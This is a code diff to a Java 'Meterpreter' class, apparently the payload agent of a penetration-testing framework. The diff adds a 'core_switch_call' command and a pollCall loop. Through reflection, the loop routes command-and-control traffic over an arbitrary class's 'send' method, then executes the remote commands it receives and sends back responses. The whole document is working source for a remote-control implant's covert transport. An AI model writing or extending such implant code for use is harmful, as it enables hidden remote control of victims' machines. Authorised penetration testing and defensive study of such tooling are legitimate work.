@@ -6,8 +6,10 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.EOFException;
 import java.io.IOException;
+import java.io.InputStream;
 import java.io.OutputStream;
 import java.io.PrintStream;
+import java.lang.reflect.Method;
 import java.net.URL;
 import java.net.URLClassLoader;
 import java.net.URLConnection;
@@ -121,7 +123,7 @@ public class Meterpreter {
 	 *            The request to execute
 	 * @return The response packet to send back
 	 */
-	private TLVPacket executeCommand(TLVPacket request) throws IOException {
+	private TLVPacket executeCommand(TLVPacket request) throws Exception {
 		TLVPacket response = new TLVPacket();
 		String method = request.getStringValue(TLVType.TLV_TYPE_METHOD);
 		if (method.equals("core_switch_url")) {
@@ -129,6 +131,13 @@ public class Meterpreter {
 			int sessionExpirationTimeout = request.getIntValue(TLVType.TLV_TYPE_UINT);
 			int sessionCommunicationTimeout = request.getIntValue(TLVType.TLV_TYPE_LENGTH);
 			pollURL(new URL(url), sessionExpirationTimeout, sessionCommunicationTimeout);
+			return null;
+		} else if (method.equals("core_switch_call")) {
+			String className = request.getStringValue(TLVType.TLV_TYPE_STRING);
+			int sessionExpirationTimeout = request.getIntValue(TLVType.TLV_TYPE_UINT);
+			int sessionCommunicationTimeout = request.getIntValue(TLVType.TLV_TYPE_LENGTH);
+			Method mth = Class.forName(className).getMethod("send", new Class[] { byte[].class });
+			pollCall(mth, sessionExpirationTimeout, sessionCommunicationTimeout);
 			return null;
 		} else if (method.equals("core_shutdown")) {
 			return null;
@@ -148,10 +157,70 @@ public class Meterpreter {
 	}
 	
 	/**
+	 * Poll by calling a given method until a shutdown request is received.
+	 */
+	private void pollCall(Method method, int sessionExpirationTimeout, int sessionCommunicationTimeout) throws Exception {
+		synchronized (this) {
+			tlvQueue = new ArrayList();
+		}
+		long deadline = System.currentTimeMillis() + sessionExpirationTimeout * 1000L;
+		long commDeadline = System.currentTimeMillis() + sessionCommunicationTimeout * 1000L;
+		final byte[] RECV = "RECV".getBytes("ISO-8859-1");
+		while (System.currentTimeMillis() < Math.min(commDeadline, deadline)) {
+			byte[] outPacket = null;
+			synchronized (this) {
+				if (tlvQueue.size() > 0)
+					outPacket = (byte[]) tlvQueue.remove(0);
+			}
+			TLVPacket request = null;
+			try {
+				DataInputStream in = new DataInputStream((InputStream)method.invoke(null, new Object[] {outPacket == null ? RECV : outPacket}));
+				int len;
+				try {
+					len = in.readInt();
+				} catch (EOFException ex) {
+					len = -1;
+				}
+				if (len != -1) {
+					int ptype = in.readInt();
+					if (ptype != PACKET_TYPE_REQUEST)
+						throw new RuntimeException("Invalid packet type: " + ptype);
+					request = new TLVPacket(in, len - 8);
+				}
+				in.close();
+				commDeadline = System.currentTimeMillis() + sessionCommunicationTimeout * 1000L;
+			} catch (IOException ex) {
+				ex.printStackTrace(getErrorStream());
+				// URL not reachable
+				if (outPacket != null) {
+					synchronized (this) {
+						tlvQueue.add(0, outPacket);
+					}
+				}
+			}
+			if (request != null) {
+				TLVPacket response = executeCommand(request);
+				if (response == null)
+					break;
+				writeTLV(PACKET_TYPE_RESPONSE, response);
+			} else if (outPacket == null) {
+				try {
+					Thread.sleep(5000);
+				} catch (InterruptedException ex) {
+					// ignore
+				}
+			}
+		}
+		synchronized (this) {
+			tlvQueue = new ArrayList();
+		}
+	}
+	
+	/**
 	 * Poll from a given URL until a shutdown request is received.
 	 * @param url
 	 */
-	private void pollURL(URL url, int sessionExpirationTimeout, int sessionCommunicationTimeout) throws IOException {
+	private void pollURL(URL url, int sessionExpirationTimeout, int sessionCommunicationTimeout) throws Exception {
 		synchronized (this) {
 			tlvQueue = new ArrayList();
 		}
